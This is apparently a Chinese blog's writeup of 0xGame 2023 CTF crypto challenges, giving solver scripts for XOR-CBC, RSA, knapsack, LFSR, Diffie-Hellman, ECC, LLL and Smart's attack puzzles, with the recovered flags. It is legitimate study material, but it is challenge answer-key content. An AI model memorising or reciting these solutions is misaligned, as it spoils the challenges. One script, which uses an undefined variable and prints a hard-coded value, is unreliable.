\u0026#39;\u0026#39;\u0026#39; 143 143 143 143 143 143 143 222 \u0026#39;\u0026#39;\u0026#39; 忽略掉最后随便找的那个字母(222那个)，能得到key=143。利用xor的性质写出decrypt, Decrypt_CbC两个解密函数(与题目中的两个加密函数相对应，甚至几乎一样)，代入数据解出flag。\nfrom Crypto.Util.number import * def bytes_xor(a,b): a,b=bytes_to_long(a),bytes_to_long(b) return long_to_bytes(a^b) def decrypt(enc,key): result=b\u0026#39;\u0026#39; for i in enc: result += ((i^key)).to_bytes(1,\u0026#39;big\u0026#39;) return result def Decrypt_CbC(enc,iv,key): result=b\u0026#39;\u0026#39; block=[enc[k*8:(k+1)*8] for k in range(len(enc)//8)] for i in block: text = decrypt(i,key) plain = bytes_xor(iv,text) iv=i result += plain return result enc = b\u0026#34;\\x8e\\xc6\\xf9\\xdf\\xd3\\xdb\\xc5\\x8e8q\\x10f\u0026gt;7.5\\x81\\xcc\\xae\\x8d\\x82\\x8f\\x92\\xd9o\u0026#39;D6h8.d\\xd6\\x9a\\xfc\\xdb\\xd3\\xd1\\x97\\x96Q\\x1d{\\\\TV\\x10\\x11\u0026#34; iv = b\u0026#39;11111111\u0026#39; key = 143 flag = Decrypt_CbC(enc,iv,key) print(flag) 密码，觅码，先有*再密 # 把flag切成四份，每份用不同的方法加密。只要判断出每份是如何加密，逐个击破即可。\nc1：Crypto.Util.number中的bytes_to_long()函数，把bytes转化成整数，用对应的long_to_bytes()解密。但还有个小细节，c1输出时变成自身的5次方，我们需要开五次方根还原c1。这里如果用pow(c1,0.2)会有精度的问题，所以采用gmpy2模块的iroot函数\nc2：把bytes中每个字节取二进制并连在一起，解密时等距离拆分还原为bytes\nc3：常见的base64编码，用对应的b64decode()函数\nc4：十六进制与bytes互化\n还有一个要注意的地方是flag内部是汉字，用utf-8解码\nfrom base64 import b64decode from Crypto.Util.number import* from gmpy2 import iroot c1a=2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551 c2=\u0026#39;10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100\u0026#39; c3 = b\u0026#39;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==\u0026#39; c4 = \u0026#39;e4bbace79a8443727970746fe68c91e68898e590a72121217d\u0026#39; c1 = iroot(c1a,5) f1 = long_to_bytes(int(c1[0])) f = [c2[i*8:(i+1)*8] for i in range(len(c2)//8)] f2 = \u0026#39;\u0026#39;.join([hex(int(\u0026#39;0b\u0026#39;+k,base=0))[2:] for k in f]) f2=bytes.fromhex(f2) f3 = b64decode(c3) f4=bytes.fromhex(c4) flag=(f1+f2+f3+f4).decode(\u0026#39;utf-8\u0026#39;) print(flag) Take my bag! # 赛后复现补充：背包dp，动态规划，这下真手撕算法了orz\n没看出是什么加密，也没找到标准的解密方式，就当成算法题做了。\n分析一下我的思路：\n题中的加密函数把明文转为二进制并逆序处理，init是给出的一个数表，关键在init[i] * int(m[i]) % n这个表达式。我们知道二进制中只会出现0和1，相应地，表达式也只会出现两种结果：\nint(m[i]) = 0，表达式等于0\nint(m[i]) = 1，init[i] * int(m[i]) % n = init[i] % n，而init中元素已经对n取过模，不会大于n。故表达式等于init[i]\n即密文c是列表init中特定项的和，这些项的索引与得到的逆序二进制数中“1”对应。解密的思路很直接，遍历所有元素并找出和刚好为c的项，就可以反推二进制数，乃至flag。\n说起来容易，但程序如果这么实现，时间复杂度还是很高的。对思路重新优化，我们可以先把c视为若干项的和，在init中逐一找到各项并从c中减去。如果这一过程能完全进行那么c会被减到0，此时这些被减去的项就是我们要求的。按这个思路编写脚本，选取 [ c减去init某一项的剩余值，在过程不成立时表示回溯情况的偏移量，被减项的索引 ] 作为关键数据保存在栈（列表memory）中，最后剩余值=0时就可以从栈中得到各所求项的索引。（一开始没发现，后来flag交了之后想起来这有点像深度优先搜索算法?）\n接下来按照索引求出二进制数，逆序还原，再转为bytes就看到flag了。\nfrom Crypto.Util.number import * w=16221818045491479713 n=9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061 c=4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111 init = [w*pow(3, i) % n for i in range(512)] memory = [] #记录上一次操作时的[剩余值,偏移量,在init中对应的索引位置] def find(p):\t#找到在init中小于给定数p的最大元素索引 for i in range(512): if init[i]\u0026lt;=p and init[i+1]\u0026gt;p: return i if p==0: return 0 def forward(num,move,index):#保存上一次操作数据，更新偏移量=0，计算剩余值 datas=[num,move,index] memory.append(datas) move=0 return num - init[index-move] num,move,index=c,0, find(c)#初始化 while True: if num==0: break elif (num - init[index - move]\u0026gt;= init[0] or num == init[index - move]) and move\u0026lt;=index: num=forward(num,move, index) index=find(num) else: num,move,index=memory[-1] move+=1 memory.pop()\t#回溯到上一次操作，向左偏移+1 m=[\u0026#39;0\u0026#39;]*512 for k in memory: m[k[2]]=\u0026#39;1\u0026#39; m=\u0026#39;\u0026#39;.join(m)[::-1] flag=long_to_bytes(int(m,2)) print(flag) BabyRSA # RSA在密码学领域是常见的非对称加密算法，破解的难度在于从公钥推出私钥，核心是超大整数的质因数分解。\n在一般的RSA加密中，m表示明文，n是一个超大整数，e为与φ(n)互素的任意整数，(e,n)作为公钥加密明文，得到密文c。解密需要私钥(d,n)，其中d是e关于模φ(n)的乘法逆元。要从密文c中解出明文m，只需要求出n的欧拉函数，为此需要将n质因数分解。\n不同于传统的n=p*q这种只有两个质因数，本题的getN()函数直接给出了16个大质数相乘的超大数n，正常的分解因数算法肯定不好使了。在查找资料的过程中发现了名叫yafu的工具，顺利的分解了n。果然是整齐的16个质数\n这样一来，就可以利用欧拉函数的性质，把各个因数减一再全部相乘，求出φ(n)，进而得到密钥去解密\n还要注意求得的结果是m*mask，要再除以mask并用long_to_bytes()还原为字符串，才能得到正确的flag。\nfrom Crypto.Util.number import * import gmpy2 n=93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597 e = 65537 c=54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801 mask = 54257528450885974256117108479579183871895740052660152544049844968621224899247 factors=[3479527847,2864469667,3561068417,2770441151, 4134768233,3281340371,3111632101,2821163021, 3978177241,3267547559,2329990801,3162958289, 2995527113,4160088337,2732757047,2436711469] phi=1 for p in factors: phi *= (p-1) #欧拉函数 d=gmpy2.invert(e,phi) #通过乘法逆元找到私钥d m=pow(c,d,n) #解密 result=gmpy2.c_div(m,mask) flag=long_to_bytes(result) print(flag) 猜谜 # 已知部分明文攻击\n题目还蛮善良的，给出加密enc()函数的同时还送上了解密的dec()函数，对密文进行第一次解密如下:\nc = b\u0026#39;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=\u0026#39; print(dec(c)) #b\u0026#39;gWM\\x84u\\xe4N\\x05x=a}\\xe5\\xb2-a}\\x9f\\x82\\xf6C\\xde[\\\\1\\x89\\xd4\\xb1\\xd0\\x10\\x9f\u0026#39; 然而第二层加密就不好办了，又又出现了未知的key。题目的意思是把key猜出来?\n分析代码，i%7 这段给了启示。无论len(key)有多大，只有前7位能发挥作用。不妨猜key就是7位的bytes。恰好我们知道flag的前七位是标准格式 '0xGame{' ，再利用xor运算的性质反推key成功。同样用xor解出flag\nkey=b\u0026#39;\u0026#39; flag=\u0026#39;\u0026#39; flagformat=b\u0026#39;0xGame{\u0026#39; text=b\u0026#39;gWM\\x84u\\xe4N\\x05X=a}\\xe5\\xb2-a}\\x9f\\x82\\xf6C\\xde[\\\\l\\x89\\xd4\\xb1\\xd0\\x10\\x9f\u0026#39; for i in range(7): key += (text[i] ^ (flagformat[i]+i)).to_bytes(1,\u0026#39;big\u0026#39;) for j in range(len(text)): flag += chr((text[j] ^ key[j%7])-j) print(flag) Vigenere # 完全没见过的加密方式，百度搜索给出的解释是“使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式”。\n直接找在线解密工具，摸索后发现解密需要密钥，而且只会对字母进行改变。查阅资料发现以下要点：\n1.明文中的所有字母都在字母表上向后偏移某个数目后被替换成密文，偏移量与密钥相对应。\n2.密钥若长度不够可以继续重复。\n现在只需要得到密钥就可以破解flag，题目没有给出密钥的任何信息（也可以暴力破解？），但结合密文：0dGmqk{79ap4i0522g0a67m6i196he52357q60f}，猜测0dGmqk与0xGame 相对应，分析各字母前后的偏移量：6，0，12，4，6。对应g,a,m,e,g ,考虑到密钥的可重复性，取game作为密钥（看起来很靠谱），放到网站解密得到flag。\nWeek2 # EzLFSR # LFSR，又是很陌生的算法。\n查了好几天资料，大概理解的差不多了。作为流密码的关键成分，LSFR也就是线性反馈移位寄存器，能够不断输出随机而长周期的序列。由此它可以作为流密钥产生器的线性驱动部分。寄存器的容量有限，当其中的数据整体左(右)移一位时，最左(右)面的数会溢出（输出）而最右(左)面会留出空位。为了有持续的输出，LSFR通过某种线性反馈函数计算出一个数补到空位，依次循环，源源不断。\n题中给出了初始状态和256位输出，根据移位寄存器的原理，我们可以用initState[i:]+outputState[:i]来表示第i组状态，同时给出计算补充右边空位数字的方法lfsr()，但其中mask未知。即不完全知道LFSR的反馈函数，但已知其级数n=128。而且明文中不包括0xGame{}，不能取巧反推反馈函数。\n注意到反馈函数中有异或运算，state和mask中元素只能取0或1。可以把mask[i]理解为寄存器第i位的数是否参与到异或运算中（抽头）。用 \\(x_i\\) 表示mask[i]， \\(k_i\\) 至 \\(k_{i+127}\\) 表示第i组状态下寄存器各位数字，从数学角度可得到异或方程组： $$ \\begin{cases} \\quad k_{1}x_1\\oplus k_{2}x_2 \\oplus\\cdots\\oplus k_{128}x_{128} = k_{129} \\\\ \\quad k_{2}x_1\\oplus k_{3}x_2 \\oplus\\cdots\\oplus k_{129}x_{128} = k_{130} \\\\ \\quad k_{3}x_1\\oplus k_{4}x_2 \\oplus\\cdots\\oplus k_{130}x_{128} = k_{131} \\\\ \\quad\\quad\\quad\\quad\\quad\\quad\\quad\\enspace\\cdots \\\\ k_{128}x_1\\oplus k_{129}x_2 \\oplus\\cdots\\oplus k_{255}x_{128} = k_{256} \\\\ \\end{cases} $$ 由于异或有“半加”的性质，用线性(加法)方程组类比异或方程组，上式等价于： $$ \\begin{cases} \\quad k_{1}x_1+ k_{2}x_2 +\\cdots+ k_{128}x_{128} \\equiv k_{129}(\\bmod2)\\\\ \\quad k_{2}x_1+ k_{3}x_2 +\\cdots+ k_{129}x_{128} \\equiv k_{130}(\\bmod2)\\\\ \\quad k_{3}x_1+ k_{4}x_2 +\\cdots+ k_{130}x_{128} \\equiv k_{131}(\\bmod2)\\\\ \\quad\\quad\\quad\\quad\\quad\\quad\\quad\\enspace\\cdots\\\\ k_{128}x_1+ k_{129}x_2 +\\cdots+ k_{255}x_{128} \\equiv k_{256}(\\bmod2)\\\\ \\end{cases} $$ 矩阵表示为： $$ \\begin{bmatrix} k_1 \u0026amp; k_2 \u0026amp; k_3 \u0026amp; \\cdots \u0026amp; k_{128}\\\\ k_2 \u0026amp; k_3 \u0026amp; k_4 \u0026amp; \\cdots \u0026amp; k_{129}\\\\ k_3 \u0026amp; k_4 \u0026amp; k_5 \u0026amp; \\cdots \u0026amp; k_{130}\\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\\\ k_{128} \u0026amp; k_{129} \u0026amp; k_{130} \u0026amp; \\cdots \u0026amp; k_{255} \\end{bmatrix}X=\\begin{bmatrix} k_{129}\\\\ k_{130}\\\\ k_{131}\\\\ \\vdots\\\\ k_{256}\\\\ \\end{bmatrix} $$ 借助软件Sage函数solve_right()，在有限环Zmod(2)中求解矩阵方程得到mask，转换为secret就可以得到flag\n#SageMath from Crypto.Util.number import * def string2bits(s): return [int(b) for b in s] def bits2string(bs): s = [str(b) for b in bs] return \u0026#39;\u0026#39;.join(s) initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0] outputState = \u0026#39;1101111111011101100001000011111101001000111000110100010011110111010011100110100100111001101010110110101110000011110101000110010010000011111111001111000110111001100111101110010100100001101001111110001010000100111101011011100010000000100000100000100111010110\u0026#39; outputState = string2bits(outputState) States_Array=[initState[i:]+outputState[:i] for i in range(128)] states=matrix(Zmod(2),States_Array) output=matrix(Zmod(2),outputState[:128]) output=output.transpose() mask=states.solve_right(output) mask=[i[0] for i in (mask)] secret=bits2string(mask) secret=long_to_bytes(int(secret,2)) flag = \u0026#39;0xGame{\u0026#39;+secret.decode(\u0026#39;utf-8\u0026#39;)+\u0026#39;}\u0026#39; print(flag) 中间的那个人 # 题目模拟了Alice和Bob两人的加密通信场景，二人使用对称加密的CBC算法。因为未事先商量好密钥，所以加密一方要想办法把密文和特殊处理的密钥一并发送给对方，这里涉及DH密钥交换算法。我们作为“中间的那个人”，通过各种方式截获了二人通信的数据如下： $$ P(A)\\equiv Alice\\equiv g^A (\\bmod\\ p) $$\n$$ P(B)\\equiv Bob\\equiv g^B(\\bmod\\ p) $$\n$$ key\\equiv P(A)^B\\equiv P(B)^A\\equiv g^{AB}(\\bmod\\ p) $$\n由数学关系我们可反推：\\(A\\equiv \\log_gP(A)\\ (\\bmod \\ p)\\) 和\\(B\\equiv \\log_gP(B)\\ \\ (\\bmod \\ p)\\)。即只需要计算其中一个离散对数，得到A或B的值，就可以计算出密钥key。\n借助SageMath计算mod 2下的离散对数：\n#SageMath p=250858685680234165065801734515633434653 G=GF(p) g=G(2) Bob=G(33067794433420687511728239091450927373) B = discrete_log(Bob,g) 再用python计算key，用题中给出的密文和初始化向量 $iv$ 解密，得到flag（其实可以放在Sage里面一步到位，但是我的Sage里面Crypto.Cipher库出了点小问题，就分开写了）\nfrom Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import sha256 g=2 p= 250858685680234165065801734515633434653 Bob= 33067794433420687511728239091450927373 Alice=235866450680721760403251513646370485539 enc=b\u0026#39;s\\x04\\xbc\\x8bT6\\x846\\xd9\\xd6\\x83 y\\xaah\\xde@\\xc9\\x17\\xdc\\x04v\\x18\\xef\\xcf\\xef\\xc5\\xfd|\\x0e\\xca\\n\\xbd#\\x94{\\x8e[.\\xe8\\xe1GU\\xfa?\\xda\\x11w\u0026#39; iv = b\u0026#34;0xGame0xGameGAME\u0026#34; B = 1620639479 key = pow(Alice,B,p) key = sha256(long_to_bytes(key)).digest() aes = AES.new(key, AES.MODE_CBC, iv) flag = aes.decrypt(enc) print(flag) Week3 # EzECC # ECC 即 EllipseCurve Cryptography，是一种基于椭圆曲线的公钥密码。在数学上椭圆曲线用 $$ y^2+axy+by=x^3+cx^2+dx+e $$ 来表示，而密码学中常取\\(a=b=c=0\\),得到椭圆曲线的一般形式 $$ y^2=x^3+dx+e $$ 密码学椭圆曲线一般定义在有限域GF(p)上。定义了二元运算：点与点的加法“ + ”，包括不同点相加以及点的自加（数乘）两种情况，与题中给出的 add() 函数和 mul() 函数相对应。同时，椭圆曲线上所有点（包括无穷远点\\(O\\)）与“ + ”运算构成abel群，满足封闭性，有限次运算后的结果依然在曲线上。\n不同于数学中光滑连续的曲线，GF(p)上的椭圆曲线只包含离散而有限的整数点以及特殊的无穷远点，点的总数称为曲线的阶\\(n\\) ,若用 \\(G\\) 表示该曲线的生成元，则满足 \\(nG = O\\)。\n曲线上两点满足 \\(Q=mP\\) ,则称 \\(m\\) 为椭圆曲线的离散对数，即 \\(m=log_PQ\\) 。ECC密码体系建立在离散对数求解难题的基础上。\n根据以上性质，我们可以分析ECC的加密过程：首先接受方确定私钥 \\(k\\) 并选择椭圆曲线E(a,b)上基点 \\(G\\) ，计算出公钥 \\(K=kG\\)。将除私钥外的信息公开给发送方。发送方将明文编码成椭圆曲线上一点 \\(M\\)（但本题并没有这样做），随机选一个整数 \\(r\\) 计算出密文｛\\(M+rK,rG\\)｝即题中的 {C_1,C_2}。解密的思路比较直接，注意到数学关系 $$ \\begin{cases} C_1=M+rK=M+rkG\\\\ C_2=rG\\\\ C_1-kC_2=M+rkG-krG=M \\end{cases} $$ 只要求出私钥 \\(k=log_GK\\) 就可以求出 \\(M\\)，难题在于求解离散对数，还好SageMath有内置的求解函数。下图是利用discrete_log()函数求出 \\(r\\) 和 \\(k\\) 的过程：\n另外还有一种思路是求出 \\(r=log_GC_2\\) ，再根据\\(M=C_1-rK\\)求出明文，同样关键在离散对数。但从上图不难发现 \\(r\\) 是一个比较小的数，也可以爆破 \\(r\\) 来规避这一难题。（好像有师傅是这么做的）\n求出 \\(k\\) 或 \\(r\\) 离flag就不远了。脚本求解：\nfrom Crypto.Util.number import * q=1139075593950729137191297 a=930515656721155210883162 b=631258792856205568553568 G = (641322496020493855620384, 437819621961768591577606) K = (781988559490437792081406, 76709224526706154630278) C_1=(55568609433135042994738, 626496338010773913984218) C_2=(508425841918584868754821, 816040882076938893064041) def add(P,Q): if P[0] != Q[0] and P[1] != Q[1]: t = ((Q[1]-P[1]) * inverse(Q[0]-P[0],q)) %q else: t = ((3*P[0]*P[0]+a) * inverse(2*P[1],q))%q x3 = t*t - P[0] - Q[0] y3 = t*(P[0] - x3) - P[1] return (x3%q, y3%q) def mul(t, A, B=0): if not t: return B return mul(t//2, add(A,A), B if not t\u0026amp;1 else add(B,A) if B else A) r=10077 k=12515237792257199894 h=mul(r,K) H=(h[0],q-h[1]) m1,m2=add(C_1,H) flag = b\u0026#39;0xGame{\u0026#39; + long_to_bytes(m1)+long_to_bytes(m2) + b\u0026#39;}\u0026#39; print(flag.decode(\u0026#39;utf8\u0026#39;)) LLL-FirstBlood # 初识LLL一头雾水，找了点格密码的资料看了看。实话说也没有理解透，但是发现题里给的MakeMask()函数很有意思。它会生成一个有限域GF(p)内的n阶方阵，各个位置的元素完全随机，但方阵的行列式恒为1。资料中称这样的矩阵为“幺模矩阵”，同时提到了格的一个性质：对于格的一组基 \\(v_1,v_2,\\cdots,v_n\\) 可以进行如下三种变换，得到新的一组基与原来的基等价。\n​\t1.交换若干个基向量的顺序\n​\t2.对基向量取负 \\(v_i\\rightarrow-v_i\\)\n​\t3.把某一基向量的k倍加到另一基向量上 \\(v_i+kv_j\\)\n如果把基表示成矩阵 \\(B_i\\) 的形式，其中列向量为基向量，那么以上三种对基的变换可以写成 \\(B_iU\\) ，这里 \\(U\\) 为幺模矩阵。\n换句话说，我们有基 \\(B_1\\)，而且 \\(B_2=B_1U\\) ，此时 \\(B_1\\) 与 \\(B_2\\) 等价，都会生成相同的格。\n题中M是第一行为编码后的密文、其余位置是随机数的4阶方阵，A是随机生成的幺模矩阵。C是M与A相乘的结果。把M看成格，与幺模矩阵A相乘后得到的格C与M等价，即\\( M \\sim C\\)。根据这种等价关系，我们尝试对C进行格基规约（LLL）化简为M。\n这里设使用LLL算法得到的格基为K，其第一行的四个元素即为被切成四份的flag，用long_to_bytes() 转化一下在拼一起就好了。\n（PS：其实不太确定 C.LLL() 得到的到底是不是M，毕竟只是试了下就出flag了，第一行肯定没问题，但是时间很紧其他行没有验证）\n#Sage from Crypto.Util.number import * p=198880159035681668071031460916089145469 c=[[1528140902799730745476264672501768332416990282355490479242339131918301176698899635154781328839496210200676497333428,2081687444435007467807250373278513114045272585243815458840083487459795021302180077490134099644993120009567147202772,3080873409460299046339495750746632185307246572817534784703936044874106809413620470006445984962733721029566440253675,3491734341995174183626991907292607070252197520631412767989879432598743851171175369180080355977574296558734415823458], [2359409535809048127331244699867147546817134802610067329431135227991488324148374065940238308147500809599395748756798,3191196199160821446351036460385791985682645040446022512790815348810555748825420237291839170774872264097466183208742,4665346530155386457242345394284286198347336281451530670818113876767736288089400119492317775648206643242839430899283,5369350746042850276067380638571565496087948799720968959426256192923852197959381101839484196445995828389461004495917], [1641407111066265429602929560264443103285908072677065498760570514577412905392260182334706635555256537745902283191251,2190536173399177167068153351271988931232272884028569669242062395087922275021628334797729266560930040116807133977244,3127556759140845426132305699421707182108351516931881411928719802847628408656887897596425133523782526561471050447359,3707239956529200159380870618471703921011276020439315706352183576289925263316580408968092016782483770373121972835410], [9883814543195849013523934427451407019514807606993414569626142656857168165339,13190422499129347541373922929251088892868361241120937213742340947017395215646,18832738552342488056498211782604832513006649329982003661701684946590064734701,22323329751908690611034666068697427811613727429398087082295754189068333861152]] C=Matrix(ZZ,c) K=C.LLL() flag=b\u0026#39;\u0026#39; for i in K[0]: flag+=long_to_bytes(-i) print(flag) LLL-SecondBlood # 题中通过encrypt()函数向noise_ 和 mask_ 两个列表各添加4个大质数，并将(mask*m + noise) % p 的结果添加到列表 c_ 中。m是我们要找出的明文。理论上我们只要在有限域GF(q)中解出至少一组形如 mask_[i] * m+noise_[i]=c_[i] 的方程就可以求出m。但本题最大的困难在于 noise 完全未知。注意到mask是511位的超大质数，再与m相乘的结果必然更大，而noise只是50位的质数，显然mask*m 远大于 noise ，我们可以把问题转化为已知高位的HNP问题，进一步，HNP问题可以在格上转化为CVP问题。\n由于对格理论了解的不够充分，解题时借鉴了CVP - CTF Wiki (ctf-wiki.org)上的部分思路和方法。 令向量 \\(M\\)=mask ,\\(C\\)=c_ , 数量阵\\(P=pE\\) ,参数\\(l\\approx log^\\frac{1}{2}p\\) (这里没弄懂底数是几，我按lg算的)。我们构造用如下矩阵表示的格 $$ \\begin{bmatrix} P\u0026amp;0\\\\ M\u0026amp;\\frac{1}{2^{l+1}} \\end{bmatrix} $$ 目标是在这个格上找到与已知向量 \\(C\\) 最近的向量 \\(C\u0026rsquo;\\)，恰好这里 \\(C\u0026rsquo;=mM\\) ，我们就可以求出m。\n利用最近平面算法（Babai\u0026rsquo;s nearest plane algorithm）求解CVP，得到flag，脚本如下（借鉴了一点点）\n#Sage from math import * from Crypto.Util.number import * q = 9342426601783650861020119568565656404715236059903009041977149778244153930435908024696666887269890479558473622355346816236972767736577737332173213722012253 mask = [6237128445236992920577225644858662677575951126467888858782461334057970069468925833844231116647406833999142659751374620280213290736114576089069396331226747, 6368031389213953889417545256750169233725975229197446803885029159767701479445576860704561593200907482372690851152126782391126462547524526631934408981070841, 5106473460982791188578285397420642137630347289252852045044021197988607082777231839839730169682158507822078412449827976663385282021916120837408192506341443, 6318090842950331228033349517542810123596316850353637421587264886413877142612686177796023049304908696413386218992511112752788640732410845589679820003047667] c_ = [3823539664720029027586933152478492780438595004453489251844133830947165342839393878831914879334660250621422877333022321117120398528430519794109624186204492, 1721659645750224819953244995460589691120672649732560768435214608167861246790136217219349234604724148039910656573436663379375048145045443527267790379816425, 668633520079344839648950502380059311916108468801009386138810324259146523323704014491547148973835774917331333581475920804677395949854411894556705238578896, 497860586379981076499130281851986010889356253371192266267220334713415782402939318483926418213877341511996918189750595755372560345085899109305344338944066] def babai(A, w): A = A.LLL(delta=0.75) G = A.gram_schmidt()[0] t = w for i in reversed(range(A.nrows())): c = ((t * G[i]) / (G[i] * G[i])).round() t -= A[i] * c return w - t M = Matrix(QQ, 5, 5) for i in range(4): M[i, i] = q M[4, i] = mask[i] M[4, 4] = 1 / (2 ** (l + 1)) closest = babai(M, vector(c_ + [0])) m=(closest[-1] * (2 ** (l + 1))) % q flag=long_to_bytes(404417766109752774365993311026206252937822359426120081323087457724287886115277329019989616964477) print(flag) Week4 # Normal ECC # 又是一道ECC题，根据上周解题经验直接求 \\(k=log_GK\\)，但是数太大了，尝试跑了几个小时sage毫无作用。\n暴力求 \\(k\\) 肯定是行不通的，这里只好换种思路。Hint中给出了 ord(E)==p 这样一个很特殊的条件，据此上网查照了若干资料，发现具有这种特殊性质的曲线有一个专属名称 “异常曲线” 即 anomalous curve，还有专门的攻击方法 “Smart‘s Attack ” 来求解离散对数。\n将 \\(P, Q\\) 扩充成 \\(E(Q_p)\\) 下的点 \\(P^′, Q^′\\)。原来的离散对数是找到 \\(n\\) 使得 \\(Q=nP\\) 且 \\(P,Q \\in E(F_p) \\)，现在只需先把 \\(P, Q\\) 拓展成 \\(P^′, Q^′\\)，然后找到 \\(n\\) 满足 \\(Q^′−nP^′=O^′\\)，其中 \\(O^′\\)是某个非整数点。\n找到函数 \\(ϕ:\\mathbb{Q}→\\mathbb{Q}\\) 使得 \\(Q=nP⇔ϕ(Q)=nϕ(P)\\)。把椭圆曲线的加法「转换」成正常的加法，也就使离散对数问题变成简单的除法： $$ n=\\frac{ϕ(P)}{ϕ(Q)} $$\n为了套上 \\(ϕ\\)，我们把式子乘上 \\(p\\) 倍，得到 \\(pO^′=pQ^′−npP^′\\)。套上 \\(ϕ\\) 函数得到: $$ n≡\\frac{ϕ(pQ^′)}{ϕ(pP^′)}(\\bmod\\ p) $$\n这里引用了资料（Smart\u0026rsquo;s Attack | Utaha\u0026rsquo;s CTF Note）中的一些分析，也比较幸运地找到了smart’s attack的代码。直接放到脚本里求出 \\(k\\)，再按常规思路解密 \\(M\\) 即可。\n完整的SageMath代码如下：\n#sage from hashlib import md5 def MD5(m):return md5(str(m).encode()).hexdigest() def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) p=11093300438765357787693823122068501933326829181518693650897090781749379503427651954028543076247583697669597230934286751428880673539155279232304301123931419 a=490963434153515882934487973185142842357175523008183292296815140698999054658777820556076794490414610737654365807063916602037816955706321036900113929329671 b=7668542654793784988436499086739239442915170287346121645884096222948338279165302213440060079141960679678526016348025029558335977042712382611197995002316466 E=EllipticCurve(GF(p),[a,b]) G=E(4045939664332192284605924284905750194599514115248885617006435833400516258314135019849306107002566248677228498859069119557284134574413164612914441502516162, 2847794627838984866808853730797794758944159239755903652092146137932959816137006954045318821531984715562135134681256836794735388745354065994745661832926404) K=E(9857925495630886472871072848615069766635115253576843197716242339068269151167072057478472997523547299286363591371734837904400286993818976404285783613138603, 9981865329938877904579306200429599690480093951555010258809210740458120586507638100468722807717390033784290215217185921690103757911870933497240578867679716) C1=E(4349662787973529188741615503085571493571434812105745603868205005885464592782536198234863020839759214118594741734453731681116610298272107088387481605173124, 10835708302355425798729392993451337162773253000440566333611610633234929294159743316615308778168947697567386109223430056006489876900001115634567822674333770) C2=E(5193866657417498376737132473732737330916570240569047910293144235752602489388092937375844109374780050061859498276712695321973801207620914447727053101524592, 684299154840371832195648774293174908478389728255128448106858267664482339440737099810868633906297465450436417091302739473407943955874648486647511119341978) assert E.order() == p k=SmartAttack(G,K,p) M=C1-k*C2 flag=\u0026#39;0xGame{\u0026#39;+MD5( M.xy()[0] )+\u0026#39;}\u0026#39; print(flag) ","date":"2024-01-01","externalUrl":null,"permalink":"/writeups/0xgame2023_crypto/","section":"Writeups","summary":"crypto writeup of 0xgame2023","title":"0xGame2023 Crypto","type":"writeups"},{"content":"An ordinary CTFer mainly interested in Reverse.\nqaq\n","date":"2024-01-01","externalUrl":null,"permalink":"/about/","section":"1n1t-Flare Blog","summary":"","title":"About","type":"page"},{"content":"","date":"2024-01-01","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]